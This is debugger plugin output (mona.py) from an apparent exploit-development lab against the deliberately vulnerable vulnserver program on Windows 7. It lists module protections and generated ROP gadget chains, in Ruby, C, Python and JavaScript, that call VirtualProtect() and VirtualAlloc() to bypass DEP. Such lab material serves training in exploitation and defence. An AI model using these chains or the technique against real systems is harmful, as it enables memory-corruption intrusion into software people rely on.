================================================================================
  Output generated by mona.py v2.0, rev 613 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : vulnserver (pid 3840)
  Current mona arguments: rop -m *.dll -cp nonull
================================================================================
  2021-01-09 23:50:43
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76d20000 | 0x76d2a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7601.23930 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x77310000 | 0x77316000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7601.23889 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\Shmuel\Desktop\vulnserver\essfunc.dll)
 0x767d0000 | 0x7689d000 | 0x000cd000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x75170000 | 0x751bb000 | 0x0004b000 | True   | True    | True  |  True    | True   | 6.1.7601.17965 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x74a10000 | 0x74a4c000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
 0x76650000 | 0x766ed000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.23894 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x768a0000 | 0x768ee000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.23914 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\Shmuel\Desktop\vulnserver\vulnserver.exe)
 0x766f0000 | 0x767c5000 | 0x000d5000 | True   | True    | True  |  True    | True   | 6.1.7601.17965 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x77320000 | 0x773cc000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7601.17744 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x77180000 | 0x772c2000 | 0x00142000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x76ba0000 | 0x76c42000 | 0x000a2000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x76130000 | 0x76165000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\system32\WS2_32.DLL)
 0x76c50000 | 0x76d19000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.dll] (C:\Windows\system32\user32.dll)
 0x772d0000 | 0x772ef000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77395a42,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76c62fca,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
      0x751acefe,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x7733f3e3,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011bb,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x773542f9,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x7738d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76c312e1,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x766783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77342361,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x773c5f2e,  # &Writable location [msvcrt.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x76c1e71d,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7735181f,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76bcade2,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x77395a42,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x6250609c,  // ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76c62fca,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [user32.dll] ** REBASED ** ASLR 
      0x751acefe,  // XCHG EAX,ESI // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x7733f3e3,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011bb,  // & jmp esp [essfunc.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x773542f9,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x76c890eb,  // NEG EAX // RETN [user32.dll] ** REBASED ** ASLR 
      0x7738d3a5,  // XCHG EAX,EBX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x76c312e1,  // POP EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x76c890eb,  // NEG EAX // RETN [user32.dll] ** REBASED ** ASLR 
      0x766783d1,  // XCHG EAX,EDX // RETN [USP10.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77342361,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x773c5f2e,  // &Writable location [msvcrt.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x76c1e71d,  // POP EDI // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  // RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x7735181f,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x76bcade2,  // PUSHAD // RETN [RPCRT4.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77395a42,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x76c62fca,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
      0x751acefe,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x7733f3e3,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011bb,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x773542f9,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x7738d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76c312e1,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c890eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x766783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77342361,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x773c5f2e,  # &Writable location [msvcrt.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x76c1e71d,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7735181f,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76bcade2,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u5a42%u7739" + // 0x77395a42 : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u609c%u6250" + // 0x6250609c : ,# ptr to &VirtualProtect() [IAT essfunc.dll]
    "%u2fca%u76c6" + // 0x76c62fca : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
    "%ucefe%u751a" + // 0x751acefe : ,# XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%uf3e3%u7733" + // 0x7733f3e3 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u11bb%u6250" + // 0x625011bb : ,# & jmp esp [essfunc.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u42f9%u7735" + // 0x773542f9 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u90eb%u76c8" + // 0x76c890eb : ,# NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
    "%ud3a5%u7738" + // 0x7738d3a5 : ,# XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u12e1%u76c3" + // 0x76c312e1 : ,# POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u90eb%u76c8" + // 0x76c890eb : ,# NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
    "%u83d1%u7667" + // 0x766783d1 : ,# XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u2361%u7734" + // 0x77342361 : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u5f2e%u773c" + // 0x773c5f2e : ,# &Writable location [msvcrt.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ue71d%u76c1" + // 0x76c1e71d : ,# POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u1485%u76bc" + // 0x76bc1485 : ,# RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u181f%u7735" + // 0x7735181f : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%uade2%u76bc" + // 0x76bcade2 : ,# PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x76c0b9e3,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x74a11294,  # ptr to &VirtualAlloc() [IAT mswsock.dll] ** REBASED ** ASLR
      0x76c9c1c3,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
      0x751acf6e,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x76676de7,  # POP EBP # RETN [USP10.dll] ** REBASED ** ASLR 
      0x625011c7,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77351834,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x767d2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x77209ed5,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x625011f0,  # POP EAX # RETN [essfunc.dll] 
      0xa28008fb,  # put delta into eax (-> put 0x00001000 into edx)
      0x76796803,  # ADD EAX,5D800705 # RETN 0x10 [kernel32.dll] ** REBASED ** ASLR 
      0x766783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x75176942,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c2e3a9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76658bcf,  # XCHG EAX,ECX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x76c1d805,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x625011f0,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76c10241,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x76c0b9e3,  // POP ECX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x74a11294,  // ptr to &VirtualAlloc() [IAT mswsock.dll] ** REBASED ** ASLR
      0x76c9c1c3,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [user32.dll] ** REBASED ** ASLR 
      0x751acf6e,  // XCHG EAX,ESI // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x76676de7,  // POP EBP // RETN [USP10.dll] ** REBASED ** ASLR 
      0x625011c7,  // & jmp esp [essfunc.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77351834,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x767d2fd0,  // NEG EAX // RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x77209ed5,  // XCHG EAX,EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x625011f0,  // POP EAX // RETN [essfunc.dll] 
      0xa28008fb,  // put delta into eax (-> put 0x00001000 into edx)
      0x76796803,  // ADD EAX,5D800705 // RETN 0x10 [kernel32.dll] ** REBASED ** ASLR 
      0x766783d1,  // XCHG EAX,EDX // RETN [USP10.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      //[---INFO:gadgets_to_set_ecx:---]
      0x75176942,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x76c2e3a9,  // NEG EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76658bcf,  // XCHG EAX,ECX // RETN [USP10.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x76c1d805,  // POP EDI // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  // RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x625011f0,  // POP EAX // RETN [essfunc.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x76c10241,  // PUSHAD // RETN [RPCRT4.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x76c0b9e3,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x74a11294,  # ptr to &VirtualAlloc() [IAT mswsock.dll] ** REBASED ** ASLR
      0x76c9c1c3,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
      0x751acf6e,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x76676de7,  # POP EBP # RETN [USP10.dll] ** REBASED ** ASLR 
      0x625011c7,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77351834,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x767d2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
      0x77209ed5,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x625011f0,  # POP EAX # RETN [essfunc.dll] 
      0xa28008fb,  # put delta into eax (-> put 0x00001000 into edx)
      0x76796803,  # ADD EAX,5D800705 # RETN 0x10 [kernel32.dll] ** REBASED ** ASLR 
      0x766783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x75176942,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c2e3a9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76658bcf,  # XCHG EAX,ECX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x76c1d805,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76bc1485,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x625011f0,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76c10241,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%ub9e3%u76c0" + // 0x76c0b9e3 : ,# POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u1294%u74a1" + // 0x74a11294 : ,# ptr to &VirtualAlloc() [IAT mswsock.dll] ** REBASED ** ASLR
    "%uc1c3%u76c9" + // 0x76c9c1c3 : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [user32.dll] ** REBASED ** ASLR 
    "%ucf6e%u751a" + // 0x751acf6e : ,# XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u6de7%u7667" + // 0x76676de7 : ,# POP EBP # RETN [USP10.dll] ** REBASED ** ASLR 
    "%u11c7%u6250" + // 0x625011c7 : ,# & jmp esp [essfunc.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u1834%u7735" + // 0x77351834 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u2fd0%u767d" + // 0x767d2fd0 : ,# NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "%u9ed5%u7720" + // 0x77209ed5 : ,# XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u11f0%u6250" + // 0x625011f0 : ,# POP EAX # RETN [essfunc.dll] 
    "%u08fb%ua280" + // 0xa28008fb : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u6803%u7679" + // 0x76796803 : ,# ADD EAX,5D800705 # RETN 0x10 [kernel32.dll] ** REBASED ** ASLR 
    "%u83d1%u7667" + // 0x766783d1 : ,# XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u6942%u7517" + // 0x75176942 : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ue3a9%u76c2" + // 0x76c2e3a9 : ,# NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u8bcf%u7665" + // 0x76658bcf : ,# XCHG EAX,ECX # RETN [USP10.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ud805%u76c1" + // 0x76c1d805 : ,# POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u1485%u76bc" + // 0x76bc1485 : ,# RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u11f0%u6250" + // 0x625011f0 : ,# POP EAX # RETN [essfunc.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u0241%u76c1" + // 0x76c10241 : ,# PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

